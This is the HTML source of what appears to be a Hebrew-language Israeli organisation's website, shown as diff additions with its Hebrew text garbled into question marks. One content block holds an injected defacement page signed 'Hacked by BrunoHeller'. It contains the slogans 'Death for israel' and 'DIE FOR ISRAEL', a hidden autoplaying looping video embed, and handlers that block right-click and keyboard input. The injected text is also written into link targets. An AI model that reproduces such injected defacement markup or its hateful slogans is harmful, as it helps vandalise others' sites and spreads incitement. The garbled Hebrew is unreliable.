+			<embed src="https://www.youtube.com/v/qWdvdhrwfmI&feature=related&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></font><font style="text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;" size="4" color="white"></font></span></b></p></td></tr></tbody></table>
+<p>&nbsp;</div>
+
+</div>
+</div>
+
+
+
+</center>
+</body>
+</html>
+</div>
+
+
+<div style="display: inline; float: right;margin-top:20px;">
+	<a href="Hacked By BrunoHeller " target="_blank">
+		????
+	</a>
+</div> 
+<div style="display: inline; float: left;width:150px;text-align:left;margin-top:20px;">???? <a href='index.php?id_cat_top=42'>??????</a></div> 
+</td>
+
+</tr>
+</table>
+</td></tr>
+
+
+
+
+
+<tr><td height="15"></td></tr>
+
+
+
+
+
+
+
+
+<tr>
+<td valign="top" >
+<table cellpadding="0" cellspacing="0" width="100%"  border="0"  >
+
+
+
+
+
+<tr><td valign="top" style="" height="100%">
+<table cellpadding="0" cellspacing="0"  border="0" width="100%" >
+
+
+
+
+
+
+<tr><td align="right" >
+  <table cellpadding="0" cellspacing="0" width="100%" border=0>
+    <tr>
+
+	  
+<td align=center  valign="top"  style="background:url(topbg2.jpg) bottom repeat-x;border-left: 1px solid #FFFFFF;padding-right:10px;padding-left:10px;padding-top:10px;padding-bottom:10px;"  >
+<table cellpadding="2" cellspacing="2" width="200" dir="rtl" >
+   
+	<tr height="55">
+		<td style="padding-bottom:10px;">
+			<a class="title" href="http://youtu.be/dBqK-XJL5pQ" target="_blank">
+				????? ?? ?????? ??????? / ???? ??????			</a>
+		</td>
+	</tr>
+  
+  
+  <tr>
+    <td style="background:url(upload/) center no-repeat #b8c3c9;">
+		<a href="http://youtu.be/dBqK-XJL5pQ" target="_blank">
+					</a>
+	</td>
+  </tr>
+  
+  
+  <tr><td style="text-align:justify;direction:rtl;height:120px;" valign="top">
+	???? ?????? ???? ?? ?????? ??????? ?? ????? ???? ??????? ??????- ???? ?????? ????? ??????, ????? ??????? ?????????. ?????? ???? ?? ????? ??????? ?????? ???"? ??? ????? ????????? ?????? ???? ??????? ??????? ?? ?????? ?????? ????? ?????? ???????.
+????? ?????? ???? ?? "????".
+  </td></tr>
+  
+    <tr><td style="padding-top:15px;">
+  	<div style="display: inline; float: right;">
+		<a href="http://youtu.be/dBqK-XJL5pQ" target="_blank"> ????</a>
+	</div> 
+<div style="display: inline; float: left;width:150px;text-align:left;">???? <a href='index.php?id_cat_top=15'>?????? ???????</a></div>
+    </td></tr>
+</table>
+
+	  </td>
+	  
+<td align=center  valign="top"  style="background:url(topbg2.jpg) bottom repeat-x;border-left: 1px solid #FFFFFF;padding-right:10px;padding-left:10px;padding-top:10px;padding-bottom:10px;"  >
+<table cellpadding="2" cellspacing="2" width="200" dir="rtl" >
+   
+	<tr height="55">
+		<td style="padding-bottom:10px;">
+			<a class="title" href="http://www.haaretz.co.il/opinions/1.1921159" target="_self">
+				??? ???? ????? ???????? / ???? ????			</a>
+		</td>
+	</tr>
+  
+  
+  <tr>
+    <td style="background:url(upload/) center no-repeat #b8c3c9;">
+		<a href="http://www.haaretz.co.il/opinions/1.1921159" target="_self">
+					</a>
+	</td>
+  </tr>
+  
+  
+  <tr><td style="text-align:justify;direction:rtl;height:120px;" valign="top">
+	????? ??? ?????? - ??? ?????? ???? - ???? ??????? ????? ??? ?????? ?????? (???, ?? ?? ???? ???????) ????? ?????? ?????? ????????? ??????. ?? ??? ??? ???????, ?? ?? ???? ????? ??????, ??????? ?? ?????? ????; ?? ????? ????? ?????? ?? ???? ??? ?? ?? ??????, ????? ????? ?? ????????? ??? ????? ???? ????? ????? ??????? ??? ????? ??? ????. 
+
+
+  </td></tr>
+  
+    <tr><td style="padding-top:15px;">
+  	<div style="display: inline; float: right;">
+		<a href="http://www.haaretz.co.il/opinions/1.1921159" target="_self"> ????</a>
+	</div> 
+    </td></tr>
+</table>
+
+	  </td>
+	  
+<td align=center  valign="top"  style="background:url(topbg2.jpg) bottom repeat-x;border-left: 1px solid #FFFFFF;padding-right:10px;padding-left:10px;padding-top:10px;padding-bottom:10px;"  >
+<table cellpadding="2" cellspacing="2" width="200" dir="rtl" >
+   
+	<tr height="55">
+		<td style="padding-bottom:10px;">
+			<a class="title" href="Hacked By BrunOhELLER " target="_blank">
+				Hacked By BrunOhELLER 			</a>
+		</td>
+	</tr>
+  
+  
+  <tr>
+    <td style="background:url(upload/) center no-repeat #b8c3c9;">
+		<a href="Hacked By BrunOhELLER " target="_blank">
+					</a>
+	</td>
+  </tr>
+  
+  
+  <tr><td style="text-align:justify;direction:rtl;height:120px;" valign="top">
+	 
+<html dir="rtl">
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="description" content="HACKED BY BrunoHeller I AM HACK TO SEND MESSAGE , MY MESSAGE =-> Read Qur'an -> FREE PALESTINE -> Falagua team -> DIE FOR ISRAEL">
+<meta name="keywords" content="HACKED BY BrunoHeller">
+
+
+
+<link rel="SHORTCUT ICON" href="http://www.tounsi.biz/favicon.ico">
+<script type="text/javascript">               
+
+/*****************************************
+* Visit our site at http://www.star28.com/ for more code
+* This notice must stay intact for use
+***********************************************/            
+//change 1 to another integer to alter the scroll speed. Greater is faster               
+var speed=1      
+var currentpos=0,alt=1,curpos1=0,curpos2=-1               
+function initialize(){               
+startit()               
+}               
+function scrollwindow(){               
+if (document.all)               
+temp=document.body.scrollTop               
+else               
+temp=window.pageYOffset               
+if (alt==0)               
+alt=1               
+else               
+alt=0               
+if (alt==0)               
+curpos1=temp               
+else               
+curpos2=temp               
+if (curpos1!=curpos2){               
+if (document.all)               
+currentpos=document.body.scrollTop+speed               
+else               
+currentpos=window.pageYOffset+speed               
+window.scroll(0,currentpos)               
+}               
+else{               
+currentpos=20               
+window.scroll(0,currentpos)               
+}               
+}               
+function startit(){               
+setInterval("scrollwindow()",30)               
+}               
+window.onload=initialize               
+</script>
+
+<style type=text/css>
+.body{
+margin: 30px  0px  20px  0px ;
+text-shadow: 0px 0px 4px #000000;
+
+}
+.image-box img { 
+   box-shadow: 0px 0px 10px #ddd;
+   -moz-box-shadow: 0px 0px 10px #000000;
+   -webkit-box-shadow: 0px 0px 10px #000000;
+   border: 6px solid #eee;
+   padding: 20px #ddd;
+   transform: rotate(-5deg);
+   -moz-transform: rotate(-5deg);
+   -webkit-transform: rotate(-5deg);
+   margin:20px 0px 10px 0px ;
+   }
+   .image-box img:hover{ 
+   padding: 20px #aaaaa;
+   transform: rotate(0deg);
+   -moz-transform: rotate(0deg);
+   -webkit-transform: rotate(0deg);
+   }
+.bacr{
+background:#444;
+border: 1px #ffffff;
+
+
+}
+.bacr:hover{
+background:#777;
+
+}
+
+.gambargetar {
+ position: relative;
+ }
+
+.page{
+background:#666666;
+border-radius: 14px;
+width:85%;
+border:yellow 5px dashed ;
+
+text-wrap:none;
+margin: 0px  0px  0px  0px ;
+
+}
+.font{
+line-height:130%;
+font-size:55px;
+font-family:impact;
+color:#ffffff;
+text-shadow: 0px 0px 4px #000000; 
+}
+
+
+.nfont{
+line-height:130%;
+font-size:45px;
+font-family:arial;
+color:yellow;
+text-shadow: 0px 0px 4px #000000; 
+}
+a:hover{
+line-height:130%;
+font-size:45px;
+font-family:impact;
+color:green;
+text-shadow: 0px 0px 4px #000000; 
+}
+
+a{
+line-height:130%;
+font-size:45px;
+font-family:impact;
+color:#ffffff;
+text-shadow: 0px 0px 4px #000000; 
+text-decoration:none;
+
+}
+.facebook ,.facebook a{
+	position: fixed;
+	float: right;
+	width:45;
+	height:45;
+	background: yellow;
+	border-radius: 10px 0px 0px 10px;
+	border:solid 1px #000;
+	cursor:pointer;
+	font-size: 0;
+	right: 0;
+	direction: ltr;
+}
+.facebook:hover,.facebook a:hover{
+
+	width:205;
+	text-align:left ;
+	font-size: 30;
+	right: 0;
+	color: #000;
+	font-family:impact;
+	text-shadow: 0px 0px 4px #ffffff; 
+	z-index: 11;
+}
+</style>
+
+<!-- this script got from www.javascriptfreecode.com coded by: Krishna Eydatoula-->
+<title>hacked by BrunoHeller</title>
+</head>
+<body  oncontextmenu="alert('copyright recived to @ \n \n https://www.facebook.com/ ');return false;" onkeydown="return false;"  bgcolor='#DDD'>
+
+<center>
+
+	<div div class=facebook><a href="https://www.facebook.com/" target="_blank" ><img  src="http://cdn1.iconfinder.com/data/icons/inside/PNG/048x048/icontexto-inside-facebook.png"  style="position: fixed; right: 0; z-index: 99; direction: ltr;">&nbsp; my account  </a></div>
+<div class=body>
+
+
+<div class=page><p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p><p align="center">
+
+<img src="http://media.digitalphotogallery.com/ednnrvskpcee/images/144b7b44-4b99-11e1-9d14-fefd616b8533/fucked01_website_image_rkml_wuxga.jpg?20120130232141"  width="50%" >
+
+<br>
+<br><br>
+<br>
+<div class=font>Hacked by BrunoHeller</div></b></p>
+<div class=font> &#1575;&#1604;&#1605;&#1608;&#1578; &#1604;&#1573;&#1587;&#1585;&#1575;&#1574;&#1610;&#1604;  </div></b></p>
+<p align="center">
+&nbsp;</p>
+<p align="center">
+<div class=font><hr width=80%></div></p>
+<div class=font>my message</div></p>
+<p align="center">&nbsp;</p><p align="center"></p>&nbsp;</p>
+<img  border="0" src="http://im24.gulfup.com/2012-09-19/134806488971.gif" width="500" height="200"></p>
+
+<div class=bacr><center><p align="center"><b><div class=nfont>Read Qur'an </div></b>
+</p></div>
+<p align="center">
+<div class="image-box">
+<img class=image-box border="0" src="http://www.world-insights.com/wp-content/uploads/2012/11/read-quran-recharge-your-iman_islamic-quotes-timeline-cover-photo.jpg" width="700" height="300"></div></p>
+<div class=bacr><center><p align="center"><b><div class=nfont>Freedom For Barghouthi</div></b>
+</p></div>
+<p align="center">
+<div class="image-box">
+<img class=image-box border="0" src="https://fbcdn-sphotos-a-a.akamaihd.net/hphotos-ak-ash4/q71/382548_142389412629066_1102370006_n.jpg" width="700" height="300"></div></p>
+
+
+<p align="center">&nbsp;</p>
+<div class=bacr>
+	<p align="center"><b><div class=nfont>free Palestine </div>
+	</p>
+	<center><p></div>
+<div class="image-box">
+<img class=image-box border="0" src="http://www.topnews.in/files/palestinian-flag_001.jpg" width="500" height="331"></div></p>
+<p align="center">
+<center><p><div class=nfont><div class=bacr>Falagua Team</div></div></font></p>
+<p align="center">
+<div class="image-box">
+<img class=image-box border="0" src="http://cdn.itproportal.com/photos/hacker1-540x334_contentfullwidth.jpg" width="449" height="331"></div></p>
+</p>
+
+
+<p><div class=nfont><div class=bacr>Death for israel</div></div></font></p>
+<p align="center">
+<div class="image-box">
+<img class=image-box border="0" src="http://news.fatakat.com/photos/sxjrhAruCJwCAbea.jpg" width="499" height="331"></div></p>
+</p>
+<p align="center">&nbsp;</p>
+
+<p><b><span>
+
+			<font size="6" color="#FFFFFF" style="text-shadow: '0px 0px 6px rgb(255', 0, 0), '0px 0px 5px rgb(300', 0, 0), '0px 0px 5px rgb(300', 0, 0); color: #ffffff; font-weight: bold">
+
+			<embed src="https://www.youtube.com/v/qWdvdhrwfmI&feature=related&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></font><font style="text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;" size="4" color="white"></font></span></b></p></td></tr></tbody></table>
+<p>&nbsp;</div>
+
+</div>
+</div>
+
+
+
+</center>
+</body>
+</html>
+
+  </td></tr>
+  
+    <tr><td style="padding-top:15px;">
+  	<div style="display: inline; float: right;">
+		<a href="Hacked By BrunOhELLER " target="_blank"> ????</a>
+	</div> 
+<div style="display: inline; float: left;width:150px;text-align:left;">???? <a href='index.php?id_cat_top=46'>????? ??????</a></div>
+    </td></tr>
+</table>
+
+	  </td>
+	</tr>
+  </table>
+</td></tr>
+
+
+
+
+
+
+</table>
+</td>
+</tr>
+
+
+
+</table>
+</td></tr>
+
+
+
+<tr><td height="15"></td></tr>
+
+
+
+
+
+
+<tr><td>
+<table cellpadding=0 cellspacing=0>
+<tr>
+
+<!-- facebook -->
+<td style="padding-left:10px;">
+<iframe src="http://www.facebook.com/plugins/likebox.php?href=http%3A%2F%2Fwww.facebook.com%2Fpages%2F%25D7%2594%25D7%259E%25D7%2595%25D7%25A2%25D7%25A6%25D7%2594-%25D7%259C%25D7%25A9%25D7%259C%25D7%2595%25D7%259D-%25D7%2595%25D7%2591%25D7%2599%25D7%2598%25D7%2597%25D7%2595%25D7%259F%2F136466429764517&amp;width=430&amp;colorscheme=light&amp;show_faces=true&amp;stream=false&amp;header=true&amp;height=210" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:430px; height:210px;" allowTransparency="true"></iframe>
+</td>
+
+
+<td valign="top" width="300" height="170" style="background:#4e6973;">
+<table cellpadding=0 cellspacing=0>
+<tr><td style="padding:6px;background:#304a54;color:white;text-align:center;font-size:18px;font-weight:bold;">
+<a href="index.php?administration" style="color:white;text-align:center;font-size:20px;font-weight:bold;">???? ??????</a>
+</td></tr>
+<tr>
+	<td valign="top" style="padding:6px;color:white;text-align:right;font-size:12px;direction:rtl;">
+		<a href="index.php?administration#member_30">
+			<img src="upload/201106132150040.Talia_Sasson.jpg" align="right" alt="" />
+		</a>
+		<strong style="font-size:16px;">???? ????? ?????</strong><br/>
+		??"? ???? ???? . ???? ???? ?????. ????? ???? (???? ????? 1951), ????? ??? ???....		<a href="index.php?administration#member_30" style="color:white;">????</a><br/><br/>
+		<a href="index.php?administration" style="color:white;">?? ???? ??????</a>
+	</td>
+</tr>
+
+</table>
+</td>
+
+</tr>
+</table>
+</td></tr>
+
+
+</table>
+</td></tr>
+
+</table>
+</td></tr>
+
+</table>
+</td></tr>
+
+<tr>
+<td height="30">&nbsp;</td>
+</tr>
+
+</table>
+
+</div>
+
+
+
+
+
+
+
+
+
+<div style=" height:250px; text-align: center; vertical-align: top; background:url(bottom.jpg) center top;">&nbsp;
+
+<table align="center" id="botstyle" border=0 class="dont_print">
+  <tr><td height="30"></td></tr>
+  <tr>
+
+
+
+<td dir="rtl" valign="top" width="120">
+<ul>
+<li><a href="main.php">???? ????</a></li>
+<li><a href="index.php?Cat=1">????? ??????</a></li>
+<li><a href="index.php?administration">????? ??????</a></li>
+<li><a href="index.php?Cat=11">?????? ????????</a></li>
+<li><a href="index.php?id_cat_top=26">??????</a></li>
+</ul>
+</td>
+
+<td dir="rtl" valign="top" width="150">
+<ul>
+<li><a href="index.php?id_cat_top=15">?????? ???????</a></li>
+<li><a href="index.php?id_cat_top=18">?????? ????????? ???????</a></li>
+<li><a href="index.php?Cat=16">??????? ?????</a></li>
+<li><a href="index.php?Cat=44">?????? ??? ????</a></li>
+</ul>
+</td>
+
+<td dir="rtl" valign="top" width="200">
+<ul>
+<li><a href="index.php?Cat=13">????? ??????</a></li>
+<li><a href="index.php?Cat=-1">????? ????????</a></li>
+<li><a href="index.php?contact=all">??? ???</a></li>
+</ul>
+</td>
+
+
+
+
+
+
+</tr>
+
+<tr>
+
+
+<td dir="rtl" colspan="20" align="center">
+<font style="font-size:10px;">© ?? ??????? ??????  <br>
+			??? ?????? ?/?? ????? ???? ????? ????? ?????, ??? ???? ???? ????? ???? ????? 
+</font>		
+</td>
+
+  </tr>
+</table>
+
+
+
+
+</div>
+
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-4382648-1";
+urchinTracker();
+</script>
+
+</body>
+</html>
